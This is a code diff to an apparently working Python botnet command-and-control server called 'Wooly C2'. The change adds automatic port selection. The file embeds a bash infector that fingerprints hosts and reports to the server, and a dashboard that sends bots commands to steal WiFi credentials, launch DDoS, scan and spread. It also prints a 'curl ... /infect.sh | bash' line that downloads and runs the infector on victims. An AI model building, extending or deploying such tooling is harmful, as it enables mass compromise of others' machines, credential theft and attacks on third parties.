@@ -1,14 +1,12 @@
 #!/usr/bin/env python3
-# Wooly VPS C2 v10.4 - FIXED FOR PYTHON 3.13
-import os, ssl, socket, json, subprocess, threading
+# Wooly VPS C2 v10.5 - PORT FAILSAFE
+import os, ssl, socket, json, subprocess, threading, time
 from http.server import HTTPServer, BaseHTTPRequestHandler
 from urllib.parse import urlparse, parse_qs
 from datetime import datetime
 from html import escape
 
-# ==================== EMBEDDED INFECTOR ====================
 INFECT_SH = '''#!/bin/bash
-# Wooly Omni-Infector v10.2
 readonly VPS_C2="$(curl -s ipinfo.io/ip 2>/dev/null || echo 127.0.0.1)"
 readonly C2_PORT=443
 readonly BOT_ID=$(printf '%s-%s-%s' "$(uname -s 2>/dev/null||echo unknown)" "$(hostname 2>/dev/null||echo unknown)" "$(whoami 2>/dev/null||echo root)" | sha256sum 2>/dev/null|cut -c1-16|tr -d '\\n')
@@ -62,7 +60,6 @@ main_silent() {
 }
 main_silent'''
 
-# ==================== C2 SERVER (FIXED) ====================
 bots = {}
 commands = {}
 loot_db = {}
@@ -92,18 +89,17 @@ class C2Server(BaseHTTPRequestHandler):
             
         elif '/bots' in self.path:
             hostname = socket.gethostbyname(socket.gethostname())
-            port = '443' if os.geteuid() == 0 else '8443'
-            html = f'''<!DOCTYPE html><html><head><title>🤖 Wooly C2 v10.4 ({len(bots)} bots)</title>
+            html = f'''<!DOCTYPE html><html><head><title>🤖 Wooly C2 v10.5 ({len(bots)} bots)</title>
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <style>body{{font-family:monospace;background:#000;color:lime;padding:20px}}input,select,button{{background:#111;color:lime;border:1px solid lime;padding:12px;width:100%;margin:5px 0;box-sizing:border-box}}pre{{background:#111;padding:15px;max-height:40vh;overflow:auto}}</style></head>
-<body><h1>🤖 <b style="color:lime">{len(bots)}</b> Bots Online</h1>
+<body><h1>🤖 <b style="color:lime">{len(bots)}</b> Bots Online - Port {self.server.server_port}</h1>
 <pre>{escape(json.dumps(bots, indent=2))}</pre>
 <h2>📡 Send Commands:</h2><form method=POST action=/cmd>
 <input name="bot_id" value="ALL" placeholder="Bot ID or ALL"><br>
 <select name="cmd"><option value="ping">Ping</option><option value="steal">💰 Steal WiFi</option><option value="ddos:scanme.nmap.org:60">🌩️ DDoS Test</option><option value="scan">🔍 Scan</option><option value="propagate">📡 Spread</option></select><br><button>🚀 EXECUTE</button></form>
 <h2>💎 Loot:</h2><pre>{escape(json.dumps(loot_db, indent=2))}</pre>
-<h3>📥 Deploy: <code>curl -k https://{hostname}:{port}/infect.sh | bash</code></h3>
-<script>setInterval(()=>fetch("/bots").then(r=>r.text()).then(d=>{{document.querySelector("pre").innerText=d.match(/{{.*}}/)[0]||""}}),3000)</script></body></html>'''
+<h3>📥 Deploy: <code>curl -k https://{hostname}:{self.server.server_port}/infect.sh | bash</code></h3>
+<script>setInterval(()=>location.reload(),3000)</script></body></html>'''
             self.send_response(200)
             self.send_header('Content-type', 'text/html')
             self.end_headers()
@@ -145,6 +141,15 @@ class C2Server(BaseHTTPRequestHandler):
     
     def log_message(self, *args): pass
 
+def find_free_port(start_port=8443):
+    for port in range(start_port, start_port + 20):
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        result = sock.connect_ex(('0.0.0.0', port))
+        sock.close()
+        if result != 0:
+            return port
+    raise Exception("No free ports found")
+
 def gen_ssl():
     if not all(os.path.exists(x) for x in ['server.crt','server.key']):
         subprocess.run(['openssl','req','-x509','-nodes','-days','365','-newkey','rsa:2048','-keyout','server.key','-out','server.crt','-subj','/CN=*','-quiet'], capture_output=True)
@@ -152,14 +157,14 @@ def gen_ssl():
 
 if __name__ == '__main__':
     gen_ssl()
-    port = 443 if os.geteuid() == 0 else 8443
+    port = find_free_port(8443)  # ✅ AUTO PORT!
     httpd = HTTPServer(('0.0.0.0', port), C2Server)
     context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
     context.load_cert_chain('server.crt', 'server.key')
     httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
     
     hostname = socket.gethostbyname(socket.gethostname())
-    print(f"🚀 C2 v10.4 → https://0.0.0.0:{port}")
+    print(f"🚀 C2 v10.5 → https://0.0.0.0:{port}")
     print(f"📱 Dashboard: https://{hostname}:{port}/bots")
     print(f"📥 Payload: curl -k https://{hostname}:{port}/infect.sh | bash")
     httpd.serve_forever()
